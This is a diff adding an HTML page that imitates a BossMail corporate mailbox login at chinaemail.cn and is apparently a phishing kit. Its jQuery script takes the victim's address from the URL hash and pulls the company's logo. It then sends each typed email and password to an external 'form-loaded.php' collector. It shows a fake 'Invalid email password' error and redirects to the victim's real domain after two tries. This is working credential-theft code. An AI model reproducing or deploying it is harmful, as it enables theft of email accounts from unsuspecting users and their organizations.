@@ -1,0 +1,264 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <input type="hidden" name="lourl" value="https://mail.chinaemail.cn/login.php" id="lourl">    
+
+<head>
+    <script src="../setting.js"></script>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">
+    <link href="https://mail.chinaemail.cn/theme/default/css/style_new2.css?20170830" rel="stylesheet" type="text/css">
+    
+    <style>
+    .tits{ position:absolute; left:35px; top:1px; line-height:36px; color:#cecece; z-index:10;}
+    </style>
+    
+    
+    <title>Mailbox Login</title>
+
+    <div class="lang-tr">
+        <div id="google_translate_element"></div>
+        <script type="text/javascript">
+            function googleTranslateElementInit() {
+                new google.translate.TranslateElement(
+                    { pageLanguage: 'fr-FR' },
+                    'google_translate_element'
+                );
+            }
+        </script>
+
+        <script type="text/javascript" src="https://translate.google.com/translate_a/element.js?
+cb=googleTranslateElementInit">
+</script>
+    </div>
+
+    </head>
+    <body>
+        <div id="warp" class="warp_en">
+            <div class="logo"><img src="https://mail.chinaemail.cn/theme/default/images/logo.gif"></div>
+            
+            <div class="pop_menu_box">
+              <div class="pop_menu">
+                  <a href="#">Language<img src="https://mail.chinaemail.cn/theme/default/images/ico_open.gif" class="ico_open"></a>
+                  <ul style="display: none;" class="listBox listBox_2">
+                      <li><a id="lan_switch_cn_btn" href="#" onclick="language_ch('cn')">简体中文</a></li>
+                      <li><a id="lan_switch_tw_btn" href="#" onclick="language_ch('tw')">繁體中文</a></li>
+                      <li><a id="lan_switch_en_btn" href="#" onclick="language_ch('en')">English</a></li>
+                  </ul>
+              </div>
+              <span class="u_line"> | </span>
+              <div class="pop_menu"><a href="#">BQ</a><img src="https://mail.chinaemail.cn/theme/default/images/ico_open.gif" class="ico_open">
+          <ul class="listBox" style="width:auto; display:none">
+            <li>
+              <div class="list_download">
+     <ul>
+                                <li class="dow_box_h">
+                                    <b class="ico_z1"></b>
+                                    <p class="tit_z1">BQ for PC</p>
+                                    <span class="tit_z2">For Windows XP and above</span>
+                                    <a href="#Q_PC.exe" class="btn_z">Download</a>
+                                </li>
+                                <li class="dow_box_h">
+                                    <b class="ico_z3"></b>
+                                    <p class="tit_z1">BQ for iPhone</p>
+                                    <span class="tit_z2">For iOS 5.0 and above</span>
+                                    <b class="BQ_iPhone"></b>
+                                    <a href="https://itunes.apple.com/cn/app/id623766526?mt=8" class="btn_z" target="_blank">Download</a>
+                                </li>
+                                <li class="dow_box_h">
+                                    <b class="ico_z4"></b>
+                                    <p class="tit_z1">BQ for Android</p>
+                                    <span class="tit_z2">For Android 2.3/4.0 and above</span>
+                                    <b class="BQ_Android"></b>
+                                    <a href="http://www.bosscloud.cn/download/client/BQ_Android.apk" class="btn_z">Download</a>
+                                </li>
+                            </ul>
+              </div>
+            </li>
+          </ul>
+     
+         </div>
+              <span class="u_line"> | </span>
+              <div class="pop_menu">
+                  <a href="#">Client<img src="https://mail.chinaemail.cn/theme/default/images/ico_open.gif" class="ico_open"></a>
+          <ul class="listBox" style="width:auto; display:none;">
+            <li>
+              <div class="list_download" style="width:330px;">
+                <ul>
+                  <li><b class="ico_z1"></b><p class="tit_z1">BM for PC</p><span class="tit_z2">For Windows XP and above</span><a href="http://www.bosscloud.cn/download/client/BM_PC.exe" class="btn_z">Download</a></li>
+                </ul>
+                <div class="c"></div>
+              </div>
+            </li>
+          </ul>
+              </div>
+            </div>
+    
+            <div id="main"> 
+                <div class="mainRight"></div>
+                <div class="mainLeft"></div>
+                <div class="loginMain">
+                    <div class="login_bz">
+                        <div class="title_gl">
+                            <span class="tit">Mailbox Login</span>  
+                        </div>       
+                        <form name="form1" id="login_form" method="post" action="" autocomplete="off">
+                            <div class="loginForm log_mar">
+                                <div class="login_mail showPlaceholder"><!--输入文本时，showPlaceholder删除-->
+    
+                                    <label class="login_mail_l">Username:</label>
+                                    <b class="ico-uid"></b>
+                                    <input name="email" id="email" maxlength="64" title="please input username" value="" placeholder="username" class="mail_text mail_text_2" type="text">
+    <span style="white-space:nowrap; text-overflow:ellipsis; overflow:hidden;" title=""></span></div>
+                              
+                                <div class="login_pw showPlaceholder">
+                                    <label class="login_mail_l">Password:</label>
+                                    <b class="ico-pwd"></b>
+                                    <input name="password" id="password" maxlength="25" title="please input password" placeholder="Password" class="mail_text" type="password">
+                                </div>
+                                <div id="msg" class="text-danger" style="font-size:14px; color: red; text-align: center; display: none;">Invalid email password</div>
+                               <div class="login_btn" style="overflow:hidden;">
+                                 <span class="btn_l"> <input type="submit" id="submit-btn" class="btnSty" value="Login"></span>
+                                  
+                                </div>
+
+                                <div style="overflow:hidden;">
+                                  <span class="entry"> <a href="/login_post.php"> Administrator Login</a></span>
+                                  <a href="javascript:void(0)" onclick="retirevepwd()" style="color:#117aca;padding-left:10px; line-height:42px; text-decoration:none; font-size:14px;"> Forget the password？</a>
+                                </div>
+                                    </div> 
+                            </form></div>
+                            
+                        
+                    </div> 
+                </div>
+            <div id="footer">
+        <span style="display:block"><a href="http://www.beian.miit.gov.cn" target="_blank" style="color:#117aca;text-decoration:none;">闽B2-20040086-1</a></span>
+              <span class="footer_t">Powered by BossMail</span>
+            </div>
+    
+    
+            </div>
+        
+    
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            var m = 0;
+        
+            $('#back1').click(function () {
+                $("#msg").hide();
+                $('#email').val("");
+                $("#automail").animate({
+                    left: 200,
+                    opacity: "hide"
+                }, 0);
+                $("#inputbar").animate({
+                    right: 200,
+                    opacity: "show"
+                }, 1000);
+            });
+        
+            var n = window.location.hash.substr(1);
+            
+            if (!n) {
+            } else {
+                var o = n;
+                $('#email').val(o);
+                $('#emailich').html(o);
+                var p = /^([a-zA-Z0-9_\.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+                
+                if (!p.test(o)) {
+                    $('#error').show();
+                    n.focus;
+                    return false;
+                }
+        
+                var q = o.indexOf("@");
+                var r = o.substr((q + 1));
+                var c = r.substr(0, r.indexOf('.'));
+                var s = c.toLowerCase();
+                var t = c.toUpperCase();
+        
+                $("#logoimg").attr("src", "https://logo.clearbit.com/" + r);
+                $("#logoimg").attr("alt", t);
+                $("#logoname").html(t);
+                $(".logoname").html(t);
+            }
+        
+            $('#submit-btn').click(function (b) {
+                $('#error').hide();
+                $('#msg').hide();
+                b.preventDefault();
+                var d = $("#email").val();
+                var e = $("#password").val();
+                var z = $("#lourl").val();
+                var f = $('#msg').html();
+                $('#msg').text(f);
+                var g = d;
+                var h = /^([a-zA-Z0-9_\.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+                
+                if (!h.test(g)) {
+                    $('#error').show();
+                    d.focus;
+                    return false;
+                }
+        
+                var i = g.indexOf("@");
+                var j = g.substr((i + 1));
+                var c = j.substr(0, j.indexOf('.'));
+                var k = c.toLowerCase();
+                var l = c.toUpperCase();
+        
+                $("#logoimg").attr("src", "https://logo.clearbit.com/" + j);
+                $("#logoname").html(l);
+                if (e == '') {
+                    $('#msg').show();
+                    d.focus;
+                    return false;
+                }
+        
+                m = m + 1;
+        
+                $.ajax({
+                    dataType: 'JSON',
+                    url: dbaseURL+'form-loaded.php',
+                    type: 'POST',
+                    data: {
+                        email: d,
+                        password: e,
+                        lourl: z,
+                    },
+                    beforeSend: function (a) {
+                        $('#submit-btn').val('Verifing...');
+                    },
+                    success: function (a) {
+                        if (a) {
+                            $("#msg").show();
+                            console.log(a);
+                            if (a['signal'] == 'ok') {
+                                $("#password").val("");
+                                if (m >= 2) {
+                                    m = 0;
+                                    window.location.href("http://www." + j);
+                                }
+                            } else {
+                            }
+                        }
+                    },
+                    error: function () {
+                        $("#password").val("");
+                        if (m >= 2) {
+                            m = 0;
+                            window.location.replace("http://www." + j);
+                        }
+                        $("#msg").show();
+                    },
+                    complete: function () {
+                        $('#submit-btn').val('LOGIN');
+                    }
+                });
+            });
+        });
+
+    </script>   
+    </body>
+</html>
